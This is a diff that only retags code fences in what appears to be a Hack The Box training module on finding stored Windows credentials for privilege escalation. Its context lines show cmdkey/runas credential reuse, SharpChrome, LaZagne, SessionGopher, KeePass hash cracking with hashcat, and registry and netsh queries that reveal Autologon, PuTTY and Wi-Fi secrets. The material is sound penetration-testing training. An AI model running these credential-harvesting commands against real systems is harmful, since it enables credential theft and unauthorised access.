@@ -12,8 +12,7 @@ There are many other techniques we can use to potentially obtain credentials on 
 
 The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.
 
-```
-        cmd
+```bat
 C:\htb> cmdkey /list
 
     Target: LegacyGeneric:target=TERMSRV/SQL01
@@ -29,8 +28,7 @@ We can also attempt to reuse the credentials using `runas` to send ourselves a r
 
 #### Run Commands as Another User
 
-```
-        powershell
+```powershell
 PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
 ```
 
@@ -42,8 +40,7 @@ PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
 
 Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\SharpChrome.exe logins /unprotect
 
   __                 _
@@ -77,8 +74,7 @@ Many companies provide password managers to their users. This may be in the form
 
 First, we extract the hash in Hashcat format using the `keepass2john.py` script.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
 
 ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
@@ -88,8 +84,7 @@ ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca171
 
 We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -140,8 +135,7 @@ When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZ
 
 We can view the help menu with the `-h` flag.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\lazagne.exe -h
 
 usage: lazagne.exe [-h] [-version]
@@ -184,8 +178,7 @@ optional arguments:
 
 As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\lazagne.exe all
 
 |====================================================================|
@@ -230,8 +223,7 @@ We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extrac
 
 We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\SessionGopher.ps1
  
 PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
@@ -288,8 +280,7 @@ Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-serve
 
 The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:
 
-```
-        cmd
+```bat
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 ```
 
@@ -301,8 +292,7 @@ The typical configuration of an Autologon account involves the manual setting of
 
 #### Enumerating Autologon with reg.exe
 
-```
-        cmd
+```bat
 C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
@@ -322,8 +312,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 
 For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.
 
-```
-        cmd
+```bat
 Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
 ```
 
@@ -333,8 +322,7 @@ Note that the access controls for this specific registry key are tied to the use
 
 First, we need to enumerate the available saved sessions:
 
-```
-        powershell
+```powershell
 PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
 
 HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
@@ -342,8 +330,7 @@ HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
 
 Next, we look at the keys and values of the discovered session "`kali%20ssh`":
 
-```
-        powershell
+```powershell
 PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
 
 HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
@@ -374,8 +361,7 @@ For additional information on `reg.exe` and working with the registry, be sure t
 
 If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.
 
-```
-        cmd
+```bat
 C:\htb> netsh wlan show profile
 
 Profiles on interface Wi-Fi:
@@ -397,8 +383,7 @@ User profiles
 
 Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.
 
-```
-        cmd
+```bat
 C:\htb> netsh wlan show profile ilfreight_corp key=clear
 
 Profile ilfreight_corp on interface Wi-Fi:
